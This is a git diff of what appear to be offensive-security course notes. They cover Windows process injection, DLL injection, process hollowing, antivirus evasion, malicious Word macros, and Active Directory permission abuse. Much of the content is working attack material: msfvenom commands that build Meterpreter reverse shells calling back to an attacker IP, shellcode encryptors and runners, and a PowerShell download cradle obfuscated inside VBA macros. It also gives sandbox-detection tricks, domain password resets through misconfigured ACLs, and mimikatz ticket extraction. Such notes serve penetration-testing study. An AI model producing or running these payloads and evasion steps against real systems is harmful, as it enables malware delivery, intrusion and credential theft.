@@ -663,9 +663,13 @@ Java-based Java Applets and **Java** JAR files can be used to gain client-side c
 
 ## Process Injection in C#
 
-Process injection with VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread
-
 ### VirtualAllocEx and WriteProcessMemory
+
+Use **OpenProcess** to open a handle to the Explorer process. PROCESS_ALL_ACCESS (0x001F0FFF) process right gives us complete access to the process.
+
+Use **VirtualAlloc** to allocate memory. Specify the size of the desired allocation, the allocation type, and the memory protections 0x1000, 0x3000 (MEM_COMMIT and MEM_RESERVE) and 0x40 (PAGE_EXECUTE_READWRITE), respectively.
+
+Create a new execution thread inside the remote process with **CreateRemoteThread**.
 
 ```csharp
 using System;
@@ -711,9 +715,9 @@ namespace ProcessInjection
 }
 ```
 
-The low-level native APIs NtCreateSection, NtMapViewOfSection, NtUnMapViewOfSection, and NtClose in ntdll.dll can be used as alternatives to VirtualAllocEx and WriteProcessMemory.
-
 ### NtCreateSection, NtMapViewOfSection, NtUnMapViewOfSection, and NtClose in ntdll.dll
+
+The low-level native APIs NtCreateSection, NtMapViewOfSection, NtUnMapViewOfSection, and NtClose in `ntdll.dll` can be used as alternatives to VirtualAllocEx and WriteProcessMemory.
 
 ```csharp
 using System;
@@ -853,6 +857,41 @@ $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoint
 
 ## DLL Injection with C#
 
+When a process needs to use an API from a DLL, it calls the **LoadLibrary** API to load it into virtual memory space.
+
+LoadLibrary can not be invoked on a remote process.
+
+=> Resolve the address of **LoadLibraryA** inside the remote process and invoke it while supplying the name of the DLL we want to load. If the address of LoadLibraryA is given as the 4th argument to **CreateRemoteThread**, it will be invoked when we call CreateRemoteThread.
+
+Several restrictions we must consider:
+
+1. The DLL must be written in C or C++ and must be unmanaged because we can not load a managed DLL into an unmanaged process.
+
+2. DLLs normally contain APIs that are called after the DLL is loaded. To call these APIs, an application have to "resolve" their names to memory addresses through the use of **GetProcAddress**. GetProcAddress cannot resolve an API in a remote process.
+
+DllMain function is called on module load.
+
+```C
+BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+```
+
+The **DLL_PROCESS_ATTACH** reason code is passed to DllMain when the DLL is being loaded into the virtual memory address space as a result of a call to LoadLibrary.
+
+=> Instead of defining our shellcode as a standard API exported by our malicious DLL, put our shellcode within the DLL_PROCESS_ATTACH switch case, where it will be executed when LoadLibrary calls DllMain.
+
+Generate a Meterpreter DLL with msfvenom:
+
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f dll -o met.dll
 ```
@@ -915,6 +954,16 @@ namespace DLLInjection
 
 ## Reflective DLL Injection in PowerShell
 
+Reflective DLL injection parses the relevant fields of the DLL's Portable Executable1 (PE) file format and maps the contents into memory.
+
+The PowerShell reflective DLL injection script (**Invoke-ReflectivePEInjection**) performs reflection to avoid writing assemblies to disk, after which it parses the desired PE file.
+
+It has 2 separate modes:
+
+1. Reflectively load a DLL or EXE into the same process
+2. Load a DLL into a remote process.
+
+
 Inject an unmanaged Meterpreter DLL into a process
 
 ```pwsh
@@ -926,6 +975,22 @@ Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
 ```
 
 ## Process Hollowing in C#
+
+We are generating network activity from processes that generally do not generate it. => migrate to `svchost.exe`
+
+All `svchost.exe` processes run by default at **SYSTEM** integrity level, meaning we cannot inject into them from a lower integrity level.
+
+Additionally, if we were to launch `svchost.exe` (instead of Notepad) and attempt to inject into it, the process will immediately terminate.
+
+=> Launch a `svchost.exe` process and modify it before it actually starts executing.
+
+Supply the **CREATE_SUSPENDED** flag (0x4) when calling **CreateProcess**, the execution of the thread is halted just before it runs the EXE's first instruction.
+
+Locate the EntryPoint of the executable and overwrite its in-memory content with our staged shellcode and let it continue to execute.
+
+To read from a remote process, use the **ReadProcessMemory** API, which is a counterpart to WriteProcessMemory.
+
+Use **WriteProcessMemory** to overwrite the original content with our shellcode. Then let the execution of the thread inside the remote process continue.
 
 ```csharp
 using System;
@@ -1054,25 +1119,31 @@ $bytes[18867] = 0
 
 ## Bypassing Antivirus with Metasploit
 
+List the available encoders 
+
 ```bash
 msfvenom --list encoders
 ```
 
 The `x86/shikata_ga_nai` encoder is a commonly-used polymorphic encoder that produces different output each time it is run => signature evasion. `x64/zutto_dekiru` encoder borrows many techniques from it.
 
+Antivirus detects the signature of the decoder or of the template executable.
+
 ```bash
 msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -e x86/shikata_ga_nai -f exe -o met.exe
 
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -e x64/zutto_dekiru -f exe -o met64_zutto.exe
-```
 
-```bash
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.176.134 LPORT=443 -e x64/zutto_dekiru -x /home/kali/notepad.exe -f exe -o met64_notepad.exe
 ```
+
+List the encryption options
 
 ```bash
 msfvenom --list encrypt
 ```
+
+The decryption routine itself can still be detected since it is static.
 
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 --encrypt aes256 --encrypt-key fdgdgj93jf43uj983uf498f43 -f exe -o met64_aes.exe
@@ -1080,9 +1151,17 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=44
 
 ## Bypassing Antivirus with C#
 
-### Encrypt the shellcode
+Encrypt the shellcode, and create a custom decryption routine to avoid detection.
 
-Hardcode the shellcode
+Use encryption with **msfvenom** to took advantage of the highly secure and complex aes256 encryption algorithm.
+
+### Use Caesar Cipher
+
+Implementing an aes256 decryption routine is not straightforward => Caesar Cipher.
+
+We chose a substitution key of 2, iterated through each byte value in the shellcode, and simply added 2 to its value.
+
+Perform a bitwise AND operation with 0xFF to keep the modified value within the 0-255 range (single byte) in case the increased byte value exceeds 0xFF.
 
 ```csharp
 using System;
@@ -1101,7 +1180,6 @@ namespace Helper
             for (int i = 0; i < buf.Length; i++)
             {
                 encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
-                // encoded[i] = (byte)((uint)buf[i] ^ 0xfa);
             }
 
             StringBuilder hex = new StringBuilder(encoded.Length * 2);
@@ -1115,143 +1193,6 @@ namespace Helper
     }
 }
 ```
-
-#### helper.exe
-
-`helper.exe <Kali IP> <msfvenom-generated csharp shellcode file>`
-
-```csharp
-using System;
-using System.Text;
-using System.Net.Http;
-using System.Text.RegularExpressions;
-
-namespace Helper
-{
-    class Program
-    {
-        static void Main(string[] args)
-        {
-            // Check if a URL was provided
-            if (args.Length != 2)
-            {
-                Console.WriteLine("Please provide the IP and filename as command-line arguments.");
-                return;
-            }
-
-            string url = "http://" + args[0] + "/" + args[1];
-
-            try
-            {
-                using (HttpClient client = new HttpClient())
-                {
-                    // Download the file content as a string directly into memory
-                    string declaration = client.GetStringAsync(url).Result; // Blocking call
-                    declaration = declaration.Trim();
-
-                    // Use a regex to extract the byte values
-                    //var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};");
-                    var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};", RegexOptions.Singleline);
-
-                    if (match.Success)
-                    {
-                        string byteValues = match.Groups[1].Value;
-                        string[] hexArray = byteValues.Split(',');
-
-                        // Create the byte array with the dynamic size based on the number of hex values
-                        byte[] buf = new byte[hexArray.Length];
-
-                        for (int i = 0; i < hexArray.Length; i++)
-                        {
-                            // Convert each hex string to a byte
-                            buf[i] = Convert.ToByte(hexArray[i].Trim(), 16);
-                        }
-
-                        byte[] encoded = new byte[buf.Length];
-                        for (int i = 0; i < buf.Length; i++)
-                        {
-                            //encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
-                            encoded[i] = (byte)((uint)buf[i] ^ 0xfa);
-                        }
-
-                        StringBuilder hex = new StringBuilder(encoded.Length * 2);
-                        //foreach (byte b in encoded)
-                        for (int i = 0; i < encoded.Length; i++)
-                        {
-                            if (i != encoded.Length - 1)
-                                hex.AppendFormat("0x{0:x2}, ", encoded[i]);
-                            else
-                                hex.AppendFormat("0x{0:x2}", encoded[i]);
-                        }
-                        Console.WriteLine("byte[] buf = new byte[" + buf.Length + "] {" + hex.ToString() + "};");
-                    }
-                    else
-                    {
-                        Console.WriteLine("The file does not contain a valid byte array declaration.");
-                    }
-                }
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"Error reading file: {ex.Message}");
-            }
-        }
-    }
-}
-```
-
-#### helper.py
-
-`python helper.py <msfvenom-generated csharp shellcode file>`
-
-```python
-import sys
-import requests
-import re
-
-def main():
-    # Check if the correct number of command-line arguments is provided
-    if len(sys.argv) != 2:
-        print("Please provide filename as command-line arguments.")
-        return
-
-    url = f"http://127.0.0.1/{sys.argv[1]}"
-
-    try:
-        # Download the file content as a string directly into memory
-        response = requests.get(url)
-        response.raise_for_status()  # Raise an error for bad responses
-        declaration = response.text.strip()
-
-        # Use a regex to extract the byte values
-        match = re.search(r'new byte\[\d+\] \{(.*?)\};', declaration, re.DOTALL)
-
-        if match:
-            byte_values = match.group(1)
-            hex_array = byte_values.split(',')
-
-            # Create the byte array with the dynamic size based on the number of hex values
-            buf = bytearray()
-
-            for hex_value in hex_array:
-                # Convert each hex string to a byte
-                buf.append(int(hex_value.strip(), 16))
-
-            # Encode the bytes
-            encoded = bytearray((b ^ 0xfa) for b in buf)
-
-            hex_representation = ', '.join(f"0x{b:02x}" for b in encoded)
-            print(f"byte[] buf = new byte[{len(buf)}] {{{hex_representation}}};")
-        else:
-            print("The file does not contain a valid byte array declaration.")
-    except Exception as ex:
-        print(f"Error reading file: {ex}")
-
-if __name__ == "__main__":
-    main()
-```
-
-Hardcode the shellcode
 
 ```csharp
 using System;
@@ -1309,7 +1250,6 @@ namespace BypassingAntivirus
             for (int i = 0; i < buf.Length; i++)
             {
                 buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
-                // buf[i] = (byte)((uint)buf[i] ^ 0xfa);
             }
 
             int size = buf.Length;
@@ -1326,7 +1266,145 @@ namespace BypassingAntivirus
 }
 ```
 
-### run.exe
+### Use XOR operation
+
+#### C Sharp
+
+Use the XOR operation to create a different encryption routine
+
+`helper.exe <Kali IP> <msfvenom-generated csharp shellcode file>`
+
+```csharp
+using System;
+using System.Text;
+using System.Net.Http;
+using System.Text.RegularExpressions;
+
+namespace Helper
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            // Check if a URL was provided
+            if (args.Length != 2)
+            {
+                Console.WriteLine("Please provide the IP and filename as command-line arguments.");
+                return;
+            }
+
+            string url = "http://" + args[0] + "/" + args[1];
+
+            try
+            {
+                using (HttpClient client = new HttpClient())
+                {
+                    // Download the file content as a string directly into memory
+                    string declaration = client.GetStringAsync(url).Result; // Blocking call
+                    declaration = declaration.Trim();
+
+                    // Use a regex to extract the byte values
+                    //var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};");
+                    var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};", RegexOptions.Singleline);
+
+                    if (match.Success)
+                    {
+                        string byteValues = match.Groups[1].Value;
+                        string[] hexArray = byteValues.Split(',');
+
+                        // Create the byte array with the dynamic size based on the number of hex values
+                        byte[] buf = new byte[hexArray.Length];
+
+                        for (int i = 0; i < hexArray.Length; i++)
+                        {
+                            // Convert each hex string to a byte
+                            buf[i] = Convert.ToByte(hexArray[i].Trim(), 16);
+                        }
+
+                        byte[] encoded = new byte[buf.Length];
+                        for (int i = 0; i < buf.Length; i++)
+                        {
+                            encoded[i] = (byte)((uint)buf[i] ^ 0xfa);
+                        }
+
+                        StringBuilder hex = new StringBuilder(encoded.Length * 2);
+                        //foreach (byte b in encoded)
+                        for (int i = 0; i < encoded.Length; i++)
+                        {
+                            if (i != encoded.Length - 1)
+                                hex.AppendFormat("0x{0:x2}, ", encoded[i]);
+                            else
+                                hex.AppendFormat("0x{0:x2}", encoded[i]);
+                        }
+                        Console.WriteLine("byte[] buf = new byte[" + buf.Length + "] {" + hex.ToString() + "};");
+                    }
+                    else
+                    {
+                        Console.WriteLine("The file does not contain a valid byte array declaration.");
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error reading file: {ex.Message}");
+            }
+        }
+    }
+}
+```
+
+#### Python
+
+`python helper.py <msfvenom-generated csharp shellcode file>`
+
+```python
+import sys
+import requests
+import re
+
+def main():
+    # Check if the correct number of command-line arguments is provided
+    if len(sys.argv) != 2:
+        print("Please provide filename as command-line arguments.")
+        return
+
+    url = f"http://127.0.0.1/{sys.argv[1]}"
+
+    try:
+        # Download the file content as a string directly into memory
+        response = requests.get(url)
+        response.raise_for_status()  # Raise an error for bad responses
+        declaration = response.text.strip()
+
+        # Use a regex to extract the byte values
+        match = re.search(r'new byte\[\d+\] \{(.*?)\};', declaration, re.DOTALL)
+
+        if match:
+            byte_values = match.group(1)
+            hex_array = byte_values.split(',')
+
+            # Create the byte array with the dynamic size based on the number of hex values
+            buf = bytearray()
+
+            for hex_value in hex_array:
+                # Convert each hex string to a byte
+                buf.append(int(hex_value.strip(), 16))
+
+            # Encode the bytes
+            encoded = bytearray((b ^ 0xfa) for b in buf)
+
+            hex_representation = ', '.join(f"0x{b:02x}" for b in encoded)
+            print(f"byte[] buf = new byte[{len(buf)}] {{{hex_representation}}};")
+        else:
+            print("The file does not contain a valid byte array declaration.")
+    except Exception as ex:
+        print(f"Error reading file: {ex}")
+
+if __name__ == "__main__":
+    main()
+```
+
+### Shellcode Runner
 
 `run.exe <Kali IP> <encrypted csharp shellcode file>`
 
@@ -1449,7 +1527,7 @@ namespace BypassingAntivirus
 }
 ```
 
-### hol.exe
+### Process Hollowing
 
 `hol.exe <Kali IP> <filename>`
 
@@ -1655,8 +1733,6 @@ namespace BypassingAntivirus
 
 ### Encrypt the shellcode
 
-Hardcode the shellcode
-
 ```csharp
 using System;
 using System.Text;
@@ -1675,7 +1751,6 @@ namespace Helper
             for (int i = 0; i < buf.Length; i++)
             {
                 encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
-                // encoded[i] = (byte)((uint)buf[i] ^ 0xfa);
             }
 
             uint counter = 0;
@@ -1696,7 +1771,7 @@ namespace Helper
 }
 ```
 
-#### helper2.exe
+#### C Sharp
 
 `helper2.exe <Kali IP> <msfvenom-generated csharp shellcode file>`
 
@@ -1786,7 +1861,7 @@ namespace Helper
 }
 ```
 
-#### helper2.py
+#### Python
 
 `python helper2.py <msfvenom-generated csharp shellcode file>`
 
@@ -1894,7 +1969,7 @@ End Sub
 
 ## Stomping On Microsoft Word
 
-### fakecode.vba
+`fakecode.vba`
 
 ```VB
 Sub Document_Open()
@@ -1909,6 +1984,10 @@ Sub MyMacro()
     MsgBox ("This is a macro test")
 End Sub
 ```
+
+The P-code is a compiled version of the VBA textual code for the specific version of Microsoft Office and VBA it was created on.
+
+If a Microsoft Word document is opened on a different computer that uses the same version and edition of Microsoft Word, the cached pre-compiled P-code is executed, avoiding the translation of the textual VBA code by the VBA interpreter.
 
 Automate the VBA Stomping process with Evil Clippy
 
@@ -1936,7 +2015,19 @@ End Sub
 
 ### Dechaining with WMI
 
-PowerShell is running as a 64-bit process => update the PowerShell shellcode runner script accordingly
+2 main issues that cause the high detection rate: the use of the **Shell** method and the identifiable PowerShell download cradle.
+
+When the PowerShell process is created directly from the VBA code through Shell, it becomes a child process of Microsoft Word. => Suspicious
+
+Use WMI to query, filter, and resolve a host of information on a Windows OS.
+
+Use WMI from VBA to create a PowerShell process instead of having it as a child process of Microsoft Word.
+
+Winmgmt is the WMI service within the SVCHOST process running under the LocalSystem account.
+
+When performing an action, the Winmgmt WMI service is created in a separate process as a child process of `Wmiprvse.exe`, i.e. de-chain the PowerShell process from Microsoft Word.
+
+PowerShell is running as a 64-bit process => Update the PowerShell shellcode runner script accordingly.
 
 ```VB
 Sub Document_Open()
@@ -1954,6 +2045,14 @@ End Sub
 ```
 
 ### Obfuscating VBA
+
+Perform some obfuscation to hide the content of any text strings from the antivirus scanner.
+
+1. the PowerShell download cradle
+2. the WMI connection string, and
+3. the WMI class name.
+
+VBA contains a function called **StrReverse** that, given an input string, returns a string in which the character order is reversed.
 
 ```VB
 Sub Document_Open()
@@ -1995,7 +2094,9 @@ Sub MyMacro()
 End Sub
 ```
 
-Perform a more complex obfuscation (Caesar cipher encryption)
+Converting the ASCII string to its decimal representation and then performing a Caesar cipher encryption on the result.
+
+Inside the loop, the byte value of each character is increased by 17. > Use if and else conditions to pad the character's decimal representation to 3 digits.
 
 ```pwsh
 $payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
@@ -2007,7 +2108,7 @@ $payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net
 [string]$output = ""
 
 $payload.ToCharArray() | %{
-    [string]$thischar = [byte][char]$_ + 23
+    [string]$thischar = [byte][char]$_ + 17
     if($thischar.Length -eq 1)
     {
         $thischar = [string]"00" + $thischar
@@ -2036,7 +2137,7 @@ Sub AutoOpen()
 End Sub
 
 Function Pears(Beets)
-    Pears = Chr(Beets - 23)
+    Pears = Chr(Beets - 17)
 End Function
 
 Function Strawberries(Grapes)
@@ -2065,7 +2166,13 @@ Function MyMacro()
 End Function
 ```
 
-When most antivirus products emulate the execution of a document, they **rename** it. During execution, check the name of the document and if it is not the same as the one we originally provided => the execution has been emulated => exit the code
+When most AV products emulate the execution of a document, they **rename** it.
+
+=> During execution, check the name of the document and if it is not the same as the one we originally provided
+
+=> the execution has been emulated
+
+=> exit the code
 
 Generates a Meterpreter reverse shell provided that our file is named `runner.doc`
 
@@ -2206,9 +2313,25 @@ End Sub
 
 ### Stomp Microsoft Word document
 
+`fakecode.vba`
+
+```VB
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    MsgBox ("This is a macro test")
+End Sub
+```
+
 ```bat
 .\EvilClippy.exe -s fakecode.vba Report0.doc
-ren Report0_EvilClippy.doc Report.doc
+mv Report0_EvilClippy.doc Report.doc -Force
 ```
 
 ### Send email
@@ -4936,6 +5059,8 @@ Determine the username it is mapped to with the **USER_NAME()** function.
 
 The **IS_SRVROLEMEMBER** function can be used to determine if a specific login is a member of a server role.
 
+`SQL.exe`
+
 ```csharp
 using System;
 using System.Data.SqlClient;
@@ -5004,10 +5129,6 @@ namespace SQL
         }
     }
 }
-```
-
-```bat
-Sql.exe
 ```
 
 ## UNC Path Injection
@@ -5688,10 +5809,6 @@ namespace SQL
 }
 ```
 
-```pwsh
-Sql.exe
-```
-
 ## Linked SQL Servers
 
 When a link from one SQL server to another is created, the administrator must specify the execution context that will be used during the connection.
@@ -5935,19 +6052,11 @@ namespace SQL
 }
 ```
 
-### Use the OPENQUERY keyword
-
-While Microsoft documentation specifies that execution of stored procedures is not supported on linked SQL servers with the OPENQUERY keyword, it is actually possible.
-
-```csharp
-
-```
-
 # Active Directory Exploitation
 
 ## AD Object Security Permissions
 
-Within Active Directory, access to an object is controlled through a Discretionary Access Control List (DACL), which consists of a series of Access Control Entries (ACE).
+Within AD, access to an object is controlled through a Discretionary Access Control List (DACL), which consists of a series of Access Control Entries (ACE).
 
 Each ACE defines whether access to the object is allowed or denied, which entity the ACE applies to, and the type of access.
 
@@ -5965,7 +6074,7 @@ E.g., `(A;;RPWPCCDCLCSWRCWDWOGA;;;S-1-1-0)`
 4. object_guid and inherit_object_guid allows the ACE to apply to only specific objects as provided by the GUID values.
 5. account_sid: the SID of the object that the ACE applies to.
 
-E.g., the ACE on object A applies to object B. This grants or denies object B access to object A with the specified access rights.
+E.g. The ACE on object A applies to object B. This grants or denies object B access to object A with the specified access rights.
 
 A = ACCESS_ALLOWED_ACE_TYPE
 
@@ -5984,18 +6093,15 @@ GA = GENERIC_ALL
 Ace Sid: 
 S-1-1-0
 
-=> we control the object given by the ACE SID, we obtain the **WRITE_DAC, WRITE_OWNER, and GENERIC_ALL** access rights among others.
+=> If we control the object given by the ACE SID, we obtain the **WRITE_DAC, WRITE_OWNER, and GENERIC_ALL** access rights among others.
 
-=> improperly configured DACLs can lead to compromise of user accounts, domain groups, or even computers.
-
-enumerate the DACLs.
+Improperly configured DACLs can lead to compromise of user accounts, domain groups, or even computers.
 
 All authenticated domain users can read AD objects (such as users, computers, and groups) and their DACLs.
 
-Enumerate weak ACL configurations from a compromised low-privilege domain user account.
+Enumerate weak ACL configurations from a low-privilege domain user account.
 
 ```pwsh
-. .\powerview.ps1
 Get-ObjectAcl -Identity offsec
 ```
 
@@ -6005,7 +6111,7 @@ SecurityIdentifier: <SecurityIdentifier>
 AceType: AccessAllowedObject
 ```
 
-The output tells us that the AD object identified by the <SecurityIdentifier> SID has ReadProperty access rights to the Offsec user. 
+=> The AD object identified by the <SecurityIdentifier> SID has ReadProperty access rights to the Offsec user. 
 
 ```pwsh
 ConvertFrom-SID <SecurityIdentifier>
@@ -6021,7 +6127,7 @@ ActiveDirectoryRights: GenericAll
 Identity: PROD\Domain Admins
 ```
 
-members of the Domain Admins group have the GenericAll access right, which equates to the file access equivalent of Full Control.
+Members of the **Domain Admins** group have the **GenericAll** access right.
 
 ### Abusing GenericAll
 
@@ -6045,21 +6151,23 @@ ActiveDirectoryRights : GenericAll
 Identity              : PROD\offsec
 ```
 
-Some applications (like Exchange or SharePoint) require seemingly excessive access rights to their associated service accounts.
+The GenericAll access right gives us full control over the TestService1 user.
 
-The GenericAll access right gives us full control over the TestService1 user => change the password of the account without knowledge of the old password
+Change the password of the account without knowledge of the old password
 
 ```pwsh
 net user testservice1 h4x /domain
 ```
 
-Once we reset the password, we can either log in to a computer with the account or create a process in the context of that user to perform a pass-the-ticket attack.
+Once reset the password, either log in to a computer with the account or create a process in the context of that user to perform a pass-the-ticket attack.
 
-We can also abuse the **ForceChangePassword** and **AllExtendedRights** access rights to change the password of a user account in a similar way without supplying the old password.
+Some applications (like Exchange or SharePoint) require excessive access rights to their associated service accounts.
 
-Since everything in Active Directory is an object, these concepts also apply to groups.
+Abuse the **ForceChangePassword** and **AllExtendedRights** access rights to change the password of a user account.
 
-Enumerate all domain groups that our current user has explicit access rights to by piping the output of `Get-DomainGroup` into Get-ObjectAcl and filtering it, in a process similar to the previous user account enumeration:
+Since everything in AD is an object, these concepts also apply to groups.
+
+Enumerate all domain groups that our current user has explicit access rights to:
 
 ```pwsh
 Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
@@ -6077,13 +6185,13 @@ Identity              : PROD\offsec
 net group testgroup offsec /add /domain
 ```
 
-As with user accounts, we can also use the **AllExtendedRights** and **GenericWrite** access rights in a similar way.
+As with user accounts, also use the **AllExtendedRights** and **GenericWrite** access rights in a similar way.
 
 ### Abusing WriteDACL
 
-All Active Directory objects have a DACL and one object access right in particular (WriteDACL) grants permission to modify the DACL itself. 
+All AD objects have a DACL and one object access right in particular (WriteDACL) grants permission to modify the DACL itself.
 
-Enumerate misconfigured user accounts with Get-DomainUser and Get-ObjectAcl:
+Enumerate misconfigured user accounts
 
 ```pwsh
 Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
@@ -6096,11 +6204,11 @@ ActiveDirectoryRights : ReadProperty, GenericExecute, WriteDacl
 Identity              : PROD\offsec
 ```
 
-Our current user has WriteDACL access rights to the TestService2 user, which allows us to add new access rights like GenericAll.
+=> Our current user has WriteDACL access rights to the TestService2 user => Add new access rights like GenericAll.
 
 Use the **Add-DomainObjectAcl** PowerView method to apply additional access rights such as GenericAll, GenericWrite, or even DCSync if the targeted object is the domain object.
 
-Add the GenericAll access right to the TestService2 object:
+Add the **GenericAll** access right to the TestService2 object:
 
 ```pwsh
 Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity offsec -Rights All
@@ -6114,21 +6222,21 @@ net user testservice2 h4x /domain
 
 The WriteDACL access right is just as powerful as GenericAll.
 
-Although enumerating access rights for our current user is beneficial, we can also map out all access rights to locate other user accounts or groups that can lead to compromise.
+We can also map out all access rights to locate other user accounts or groups that can lead to compromise.
 
 Perform against a large network relatively easily with the BloodHound, PowerShell script or its C# counterpart SharpHound.
 
 These tools enumerate all domain attack paths including users, groups, computers, GPOs, and misconfigured access rights.
 
-We can also leverage the BloodHound JavaScript web application6 locally to visually display prospective attack paths, which is essential during a penetration test against large Active Directory infrastructures.
+Leverage the BloodHound JavaScript web application locally to visually display prospective attack paths.
 
 ## Kerberos Delegation
 
-E.g., An internal web server application that is only available to company employees, uses Windows Authentication and retrieves data from a backend database. The web application should only be able to access data from the database server if the user accessing the web application has appropriate access according to Active Directory group membership.
+An internal web server application that is only available to company employees, uses Windows Authentication and retrieves data from a backend database. The web application should only be able to access data from the database server if the user accessing the web application has appropriate access according to AD group membership.
 
-When the web application uses Kerberos authentication, it is only presented with the user's service ticket. This service ticket contains access permissions for the web application, but the web server service account can not use it to access the backend database. => the **Kerberos double-hop issue**.
+When the web application uses Kerberos authentication, it is only presented with the user's service ticket. This service ticket contains access permissions for the web application, but the web server service account can not use it to access the backend database => the **Kerberos double-hop issue**.
 
-*Kerberos delegation* solves this design issue and provides a way for the web server to authenticate to the backend database on behalf of the user.
+=> **Kerberos delegation** provides a way for the web server to authenticate to the backend database on behalf of the user.
 
 Several implementations include **unconstrained delegation**, **constrained delegation**, and **resource based constrained delegation**.
 
@@ -6136,69 +6244,49 @@ Resource-based constrained delegation requires a domain functional level of 2012
 
 ### Unconstrained Delegation
 
-When a user successfully logs in to a computer, a Ticket Granting Ticket (TGT) is returned. Once the user requests access to a service that uses Kerberos authentication, a Ticket Granting Service ticket (TGS) is generated by the Key Distribution Center (KDC) based on the TGT and returned to the user.
+When a user successfully logs in to a computer, a Ticket Granting Ticket (TGT) is returned.
+
+Once the user requests access to a service that uses Kerberos authentication, a Ticket Granting Service ticket (TGS) is generated by the Key Distribution Center (KDC) based on the TGT and returned to the user.
 
 This TGS is then sent to the service, which validates the access.
 
-Since the service cannot reuse the TGS to authenticate to a backend service, any Kerberos authentication stops here.
+Since the service cannot reuse the TGS to authenticate to a backend service, unconstrained delegation solves this with a **forwardable TGT**.
 
-Unconstrained delegation solves this with a **forwardable TGT**.
 When the user requests access for a service ticket against a service that uses unconstrained delegation, the request also includes a forwardable TGT.
  
 The KDC returns a **TGT with the forward flag set** along with a session key for that TGT and a regular TGS. The user's client embeds the TGT and the session key into the TGS and sends it to the service, which can now impersonate the user to the backend service.
 
 Since the frontend service receives a forwardable TGT, it can perform authentication on behalf of the user to any service, not just the intended backend service.
 
-=> If we succeed in **compromising the web server service** and a user authenticates to it, we can steal the user's TGT and authenticate to any service.
+=> If we **compromised the web server service** and a user authenticates to it, we can steal the user's TGT and authenticate to any service.
 
 The Domain Controller stores the information about computers configured with unconstrained delegation and makes this information available for all authenticated users.
 
 The information is stored in the **userAccountControl** property as **TRUSTED_FOR_DELEGATION**.
-
-From the Windows 10 client as the Offsec domain user:
 
 ```pwsh
 Get-DomainComputer -Unconstrained
 ```
 
 ```
-distinguishedname                        : CN=APPSRV01,OU=prodComputers,DC=prod,DC=corp1,DC=com
-samaccountname                           : APPSRV01$
-samaccounttype                           : MACHINE_ACCOUNT
-objectcategory                           : CN=Computer,CN=Schema,CN=Configuration,DC=corp1,DC=com
-serviceprincipalname                     : {TERMSRV/APPSRV01, TERMSRV/APPSRV01.prod.corp1.com,
-                                           WSMAN/APPSRV01, WSMAN/APPSRV01.prod.corp1.com...}
-useraccountcontrol                       : WORKSTATION_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
-name                                     : APPSRV01
-dnshostname                              : APPSRV01.prod.corp1.com
+distinguishedname       : CN=APPSRV01,OU=prodComputers,DC=prod,DC=corp1,DC=com
+samaccountname          : APPSRV01$
+samaccounttype          : MACHINE_ACCOUNT
+objectcategory          : CN=Computer,CN=Schema,CN=Configuration,DC=corp1,DC=com
+useraccountcontrol      : WORKSTATION_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
+name                    : APPSRV01
+dnshostname             : APPSRV01.prod.corp1.com
 ```
 
 The appsrv01 machine is configured with unconstrained delegation.
 
 **Service accounts** can also be configured with unconstrained delegation if the application executes in the context of the service account rather than the **machine account**.
 
-When unconstrained delegation is operating normally, the **service account** hosting the application can freely make use of the forwarded tickets it receives from users. => if we compromise the service account, we can exploit unconstrained delegation **without needing local administrative privileges**.
+When unconstrained delegation is operating normally, the **service account** hosting the application can freely make use of the forwarded tickets it receives from users
 
-To abuse unconstrained delegation, we must first compromise the computer or service account.
+=> If we compromise the service account, we can exploit unconstrained delegation **without needing local administrative privileges**.
 
-Finding IP address of appsrv01
-
-```pwsh
-nslookup appsrv01
-```
-
-We must perform lateral movement onto appsrv01
-
-=> Log in to appsrv01 as the Offsec user instead, which is local administrator on the target system.
-
-Extract the TGTs supplied by users to IIS.
-
-```
-privilege::debug
-sekurlsa::tickets
-```
-
-We find TGTs and TGSs related to the Offsec user along with the computer account, but no other domain users.
